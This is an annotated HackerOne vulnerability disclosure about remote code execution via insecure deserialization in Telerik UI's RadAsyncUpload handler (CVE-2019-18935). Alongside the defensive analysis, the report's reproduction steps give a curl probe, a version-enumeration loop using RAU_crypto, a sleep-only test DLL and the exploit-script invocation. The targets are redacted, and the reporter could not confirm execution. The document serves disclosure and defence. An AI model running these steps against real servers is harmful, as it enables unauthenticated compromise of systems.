# Remote Code Execution via Insecure Deserialization in Telerik UI (CVE-2019-18935)

## Metadata
- **Source:** HackerOne
- **Report:** 1174185 | https://hackerone.com/reports/1174185
- **Submitted:** 2021-04-25
- **Reporter:** z32
- **Program:** HackerOne
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Insecure Deserialization, Arbitrary File Upload, Remote Code Execution
- **CVEs:** CVE-2017-11317, CVE-2019-18935
- **Category:** memory-binary

## Summary
A vulnerability in Telerik UI's RadAsyncUpload handler (WebResource.axd?type=rau) allows unauthenticated attackers to upload arbitrary files and achieve remote code execution through insecure deserialization. The vulnerability affects multiple Telerik UI versions including those vulnerable to CVE-2017-11317 and CVE-2019-18935, enabling attackers to execute arbitrary .NET assemblies on the server.

## Attack scenario
1. Attacker identifies Telerik UI installation by probing WebResource.axd?type=rau endpoint and confirming RAU handler registration
2. Attacker enumerates vulnerable Telerik UI version by attempting uploads with known vulnerable versions using RAU_crypto tool
3. Once vulnerable version is identified, attacker crafts a malicious .NET DLL payload containing backdoor or reverse shell code
4. Attacker uses CVE-2019-18935 exploit script to upload the malicious DLL through the insecure deserialization gadget chain
5. Server deserializes the malicious payload, triggering automatic loading and execution of the attacker's DLL in the application context
6. Attacker gains code execution with privileges of the IIS application pool, enabling data exfiltration, lateral movement, and privilege escalation

## Root cause
Telerik UI's RadAsyncUpload handler uses insecure .NET deserialization without proper validation of uploaded content. The vulnerability stems from: (1) lack of authentication on the file upload endpoint, (2) insufficient validation of uploaded file types and contents, (3) automatic loading of uploaded assemblies, and (4) use of vulnerable deserialization gadget chains that allow arbitrary code execution.

## Attacker mindset
An attacker would recognize that this is a high-value target due to Telerik UI's widespread deployment in enterprise environments. The public availability of the RAU_crypto tool and CVE-2019-18935 exploit greatly lowers the barrier to entry. The attacker would be motivated by the ability to gain initial access without authentication, escalate within the network, and maintain persistent access through code execution.

## Defensive takeaways
- Immediately patch or update Telerik UI to versions that remediate CVE-2019-18935 and CVE-2017-11317
- Implement network-level access controls restricting access to Telerik.Web.UI.WebResource.axd endpoints to authorized users only
- Disable RadAsyncUpload handler if not required for application functionality
- Implement strong input validation and file type restrictions on all file upload endpoints
- Avoid using unsafe deserialization patterns; prefer safe serialization formats like JSON or Protocol Buffers
- Run IIS application pools with least privilege principles and restrict file system permissions
- Monitor for suspicious uploads to temporary directories and unusual assembly loading patterns
- Implement Web Application Firewall (WAF) rules to detect and block known CVE-2019-18935 exploitation patterns
- Maintain an inventory of all Telerik UI installations and versions across the organization

## Variant hunting
Researchers should investigate: (1) other Telerik components with similar deserialization patterns, (2) other ASP.NET applications exposing unauthenticated upload handlers, (3) alternative gadget chains that can be used to exploit unsafe deserialization in .NET Framework, (4) whether similar vulnerabilities exist in other file upload handlers exposed through WebResource.axd with different type parameters, (5) authenticated bypass techniques if the handler is supposedly protected, and (6) whether the vulnerability affects other Telerik products like Telerik Reporting or Telerik Analytics.

## MITRE ATT&CK
- T1190
- T1203
- T1566.002
- T1552.007
- T1552.001
- T1059.003
- T1570
- T1021.002

## Notes
The reporter appears to have had partial success in confirming file upload capability but was unable to fully demonstrate code execution at time of submission, noting '02:30 AM here at the moment so I am heading to bed.' This suggests the vulnerability was responsibly disclosed even without complete proof-of-concept. The vulnerability affects publicly identifiable Telerik installations and requires no authentication, making it a severe risk. The availability of public tools (RAU_crypto) significantly amplifies the risk. Organizations should treat this as a critical priority for patching.

## Full report
<details><summary>Expand</summary>

**Description:**
https://██████/██████████/Telerik.Web.UI.WebResource.axd?type=rau is vulnerable to CVE-2017-11317 and CVE-2019-18935, allowing an attacker to upload arbitrary files and gain remote code execution on the underlying system.

## References
https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui

## Impact

An attacker can execute code on the vulnerable server, allowing an attacker to gain a foothold and exfiltrate data. Depending on the security posture of the underlying system, an attacker may be able to escalate privileges or laterally move to other systems within the network using this access.

## System Host(s)
████

## Affected Product(s) and Version(s)
Telerik UI Version ███

## CVE Numbers
CVE-2017-11317, CVE-2019-18935

## Steps to Reproduce
## Verify the Upload Handler is Registered
First, confirm the file upload handler is registered by issuing the following request:
```bash 
curl -sk https://██████████/██████████/Telerik.Web.UI.WebResource.axd?type=rau
```
You should see the following response:
```
{ "message" : "RadAsyncUpload handler is registered succesfully, however, it may not be accessed directly." }
```


## Version Identification
Next, you will need to install `RAU_crypto` (https://github.com/bao7uo/RAU_crypto) and use it to submit upload requests with known vulnerable versions until finding the correct version. After `RAU_crypto` has been installed, you can use the following script (with the attached _versions.txt_ file):
```bash
echo 'test' > testfile.txt
for VERSION in $(cat versions.txt); do
            echo -n "$VERSION: "
                python3 RAU_crypto.py -P '█████' "$VERSION" testfile.txt https://█████████/█████/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo
        done
```

This uploads a file (in this case, `testfile.txt`) to the `█████` directory on the target server. The contents of my `testfile.txt` simply included the word "test".

The script should eventually identify a vulnerable version (`████████`), indicating the file upload succeeded and showing an encrypted blob of data related to the uploaded file:
```bash
█████████: {"fileInfo":{"FileName":"RAU_crypto.bypass","ContentType":"text/html","ContentLength":5,"DateJson":█████ }
```

## Compiling a Test Payload
Now that we know we can upload a file to the target, we can attempt to exploit the deserialization vulnerability. To do this, we can compile and upload a DLL that causes the server to sleep for 10 seconds before responding:
```c
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
        Sleep(10000);  // Time interval in milliseconds.
    return TRUE;
}
```

As a .NET application will only load an assembly once with a given name, the dll from my test will only successfully sleep the server on the first exploit. I have compiled and attached an unused dll for testing purposes if desired (if not, just follow the steps from the link in the references section).

## Exploitation
Now that we have our test payload ready, we can use the attached _CVE-2019-18935.py_ script to upload and execute the dll.

```bash
python3 CVE-2019-18935.py -u https://███████/███/Telerik.Web.UI.WebResource.axd?type=rau -v ██████████ -f '███' -p sleep_2020070207013954_amd64.dll
```

> *Note: I'm having trouble getting the server to sleep with the crafted `.dll`. The files are getting uploaded, but do not seem to be causing the server to sleep as expected. It is 02:30 AM here at the moment so I am heading to bed but will update tomorrow with more info in the comments, and will end up self closing if I can't get execution.*

## Suggested Mitigation/Remediation Actions
Update TelerikUI to the latest (or a patched) version.



</details>

---
*Analysed by Claude on 2026-05-12*
